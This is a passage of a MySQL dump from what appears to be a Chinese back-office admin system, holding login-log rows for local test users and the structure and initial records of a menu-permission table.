INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (369, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 16:16:34');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (370, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 16:26:15');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (371, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 16:45:02');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (372, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 16:49:01');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (373, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 16:52:56');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (374, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 16:53:30');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (375, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 16:54:15');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (376, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:03:51');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (377, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:05:01');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (378, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2023-11-09 19:10:02');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (379, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:10:48');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (380, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:12:06');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (381, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:12:41');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (382, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:13:43');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (383, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:14:27');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (384, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:19:37');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (385, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '1', '验证码错误', '2023-11-09 19:22:33');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (386, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:22:37');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (387, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:23:54');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (388, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:24:40');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (389, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:25:41');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (390, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:26:35');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (391, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:27:46');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (392, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '1', '验证码错误', '2023-11-09 19:29:38');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (393, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:29:43');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (394, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:31:07');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (395, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:31:56');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (396, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:33:23');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (397, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:34:45');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (398, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:36:08');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (399, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:37:26');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (400, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:38:08');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (401, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:47:18');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (402, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 19:48:16');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (403, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-09 19:50:57');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (404, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 20:22:52');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (405, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 20:26:28');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (406, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 20:29:36');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (407, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 20:34:38');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (408, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 20:37:28');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (409, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 20:39:22');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (410, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 20:49:31');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (411, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 20:50:25');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (412, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 20:52:40');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (413, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 20:57:59');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (414, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 21:08:41');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (415, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 21:12:14');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (416, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 11 (iPhone)', '0', '登录成功', '2023-11-09 21:24:37');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (417, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-09 21:34:46');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (418, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-09 21:44:57');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (419, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-10 09:30:02');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (420, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-10 09:36:27');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (421, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-11-10 09:44:48');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (422, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-10 09:44:56');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (423, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-15 08:35:10');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (424, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-15 08:39:29');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (425, 'xiaoliu', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-15 08:39:38');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (426, 'xiaoliu', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-15 08:39:58');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (427, 'xiaoli', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-15 08:40:05');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (428, 'xiaoli', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-15 08:40:20');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (429, 'xiaoliu', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-15 08:40:28');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (430, 'xiaoliu', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-15 08:57:49');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (431, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-15 08:57:57');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (432, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-15 09:19:04');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (433, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-15 10:31:48');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (434, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-15 10:32:00');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (435, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-16 11:27:33');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (436, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-19 21:51:38');
COMMIT;

-- ----------------------------
-- Table structure for sys_menu
-- ----------------------------
DROP TABLE IF EXISTS `sys_menu`;
CREATE TABLE `sys_menu` (
  `menu_id` bigint NOT NULL AUTO_INCREMENT COMMENT '菜单ID',
  `menu_name` varchar(50) COLLATE utf8mb4_general_ci NOT NULL COMMENT '菜单名称',
  `parent_id` bigint DEFAULT '0' COMMENT '父菜单ID',
  `order_num` int DEFAULT '0' COMMENT '显示顺序',
  `path` varchar(200) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '路由地址',
  `component` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '组件路径',
  `query` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '路由参数',
  `is_frame` int DEFAULT '1' COMMENT '是否为外链（0是 1否）',
  `is_cache` int DEFAULT '0' COMMENT '是否缓存（0缓存 1不缓存）',
  `menu_type` char(1) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '菜单类型（M目录 C菜单 F按钮）',
  `visible` char(1) COLLATE utf8mb4_general_ci DEFAULT '0' COMMENT '菜单状态（0显示 1隐藏）',
  `status` char(1) COLLATE utf8mb4_general_ci DEFAULT '0' COMMENT '菜单状态（0正常 1停用）',
  `perms` varchar(100) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '权限标识',
  `icon` varchar(100) COLLATE utf8mb4_general_ci DEFAULT '#' COMMENT '菜单图标',
  `create_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '备注',
  PRIMARY KEY (`menu_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2037 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='菜单权限表';

-- ----------------------------
-- Records of sys_menu
-- ----------------------------
BEGIN;
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1, '系统管理', 0, 1, 'system', NULL, '', 1, 0, 'M', '0', '0', '', 'system', 'admin', '2023-10-23 20:57:31', '', NULL, '系统管理目录');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2, '系统监控', 0, 2, 'monitor', NULL, '', 1, 0, 'M', '0', '0', '', 'monitor', 'admin', '2023-10-23 20:57:31', '', NULL, '系统监控目录');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (100, '用户管理', 1, 1, 'user', 'system/user/index', '', 1, 0, 'C', '0', '0', 'system:user:list', 'user', 'admin', '2023-10-23 20:57:31', '', NULL, '用户管理菜单');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (101, '角色管理', 1, 2, 'role', 'system/role/index', '', 1, 0, 'C', '0', '0', 'system:role:list', 'peoples', 'admin', '2023-10-23 20:57:31', '', NULL, '角色管理菜单');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (102, '菜单管理', 1, 3, 'menu', 'system/menu/index', '', 1, 0, 'C', '0', '1', 'system:menu:list', 'tree-table', 'admin', '2023-10-23 20:57:31', 'admin', '2023-11-07 14:39:31', '菜单管理菜单');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (103, '部门管理', 1, 4, 'dept', 'system/dept/index', '', 1, 0, 'C', '0', '0', 'system:dept:list', 'tree', 'admin', '2023-10-23 20:57:31', 'admin', '2023-10-25 15:37:54', '部门管理菜单');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (104, '岗位管理', 1, 5, 'post', 'system/post/index', '', 1, 0, 'C', '1', '0', 'system:post:list', 'post', 'admin', '2023-10-23 20:57:31', 'admin', '2023-10-25 15:36:55', '岗位管理菜单');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (105, '字典管理', 1, 6, 'dict', 'system/dict/index', '', 1, 0, 'C', '0', '0', 'system:dict:list', 'dict', 'admin', '2023-10-23 20:57:31', '', NULL, '字典管理菜单');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (106, '参数设置', 1, 7, 'config', 'system/config/index', '', 1, 0, 'C', '0', '0', 'system:config:list', 'edit', 'admin', '2023-10-23 20:57:31', '', NULL, '参数设置菜单');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (107, '通知公告', 1, 8, 'notice', 'system/notice/index', '', 1, 0, 'C', '1', '0', 'system:notice:list', 'message', 'admin', '2023-10-23 20:57:31', 'admin', '2023-10-25 15:37:02', '通知公告菜单');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (108, '日志管理', 1, 9, 'log', '', '', 1, 0, 'M', '0', '0', '', 'log', 'admin', '2023-10-23 20:57:31', '', NULL, '日志管理菜单');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (109, '在线用户', 2, 1, 'online', 'monitor/online/index', '', 1, 0, 'C', '0', '0', 'monitor:online:list', 'online', 'admin', '2023-10-23 20:57:31', '', NULL, '在线用户菜单');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (112, '服务监控', 2, 4, 'server', 'monitor/server/index', '', 1, 0, 'C', '0', '0', 'monitor:server:list', 'server', 'admin', '2023-10-23 20:57:31', '', NULL, '服务监控菜单');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (500, '操作日志', 108, 1, 'operlog', 'monitor/operlog/index', '', 1, 0, 'C', '0', '0', 'monitor:operlog:list', 'form', 'admin', '2023-10-23 20:57:31', '', NULL, '操作日志菜单');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (501, '登录日志', 108, 2, 'logininfor', 'monitor/logininfor/index', '', 1, 0, 'C', '0', '0', 'monitor:logininfor:list', 'logininfor', 'admin', '2023-10-23 20:57:31', '', NULL, '登录日志菜单');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1000, '用户查询', 100, 1, '', '', '', 1, 0, 'F', '0', '0', 'system:user:query', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1001, '用户新增', 100, 2, '', '', '', 1, 0, 'F', '0', '0', 'system:user:add', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1002, '用户修改', 100, 3, '', '', '', 1, 0, 'F', '0', '0', 'system:user:edit', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1003, '用户删除', 100, 4, '', '', '', 1, 0, 'F', '0', '0', 'system:user:remove', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
